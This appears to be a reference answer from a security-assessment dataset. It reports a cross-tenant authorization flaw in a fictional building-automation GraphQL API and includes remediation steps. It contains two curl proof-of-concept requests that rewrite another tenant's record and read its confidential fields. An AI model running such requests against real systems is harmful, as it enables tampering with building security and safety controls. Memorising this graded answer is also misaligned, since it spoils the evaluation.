# Expected Response

## System
- Domain: Smart Home / Building Automation
- System: NeoBuild BAS Platform
- Example ID: GQL-0093

## Priority Findings

### Finding 1: Smart Home Building Automation Write Operation Without Ownership Check (Pattern 1.6)
**Severity:** Critical
**Category:** BOLA / Write Operations

**Summary:**
Per §5.0 (Pattern 1.6 — write operations without ownership check): The `updateResource` mutation lacks tenantId enforcement, allowing cross-tenant modification of smart home/building automation records. An attacker from `tenant-082e` issued `updateResource(id: "R-2093", input: {status: "approved", ownerId: "attacker-082e3aaa"})` against building automation record `R-2093` belonging to `tenant-3aaa`. In BAS systems, unauthorized write operations can modify HVAC settings, access control states, lighting schedules, and security system configurations — posing physical security and safety risks.

**Evidence from HAR:**
- Request: `POST https://api.neobuild-bas-plat.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-082e`
- Mutation: `updateResource(id: "R-2093", input: {status: "approved", ownerId: "attacker-082e3aaa"}) { resourceId status }`
- Response `200 OK`; `tenantId: "tenant-3aaa"`, `sensitiveField: "CONFIDENTIAL-082e3aaa"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-082e3aaa`

## Steps to Reproduce

### Step 1 — Unauthorized BAS write operation (HAR)
```bash
curl -s -X POST https://api.neobuild-bas-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-082e" \
  -d '{"query": "mutation { updateResource(id: \"R-2093\", input: {status: \"approved\", ownerId: \"attacker-082e3aaa\"}) { resourceId status } }"}'
```
**Vulnerable:** Cross-tenant BAS record mutated; `ownerId` poisoned. **Secure:** FORBIDDEN.

### Step 2 — Read cross-tenant building automation record
```bash
curl -s -X POST https://api.neobuild-bas-plat.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-082e" \
  -d '{"query": "query { getResource(id: \"R-2093\") { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable:** BAS configuration from `tenant-3aaa` exposed.

## Remediation
1. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` from `ResourceInput` — never client-writable.
3. Physical access mutations require additional multi-factor confirmation.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
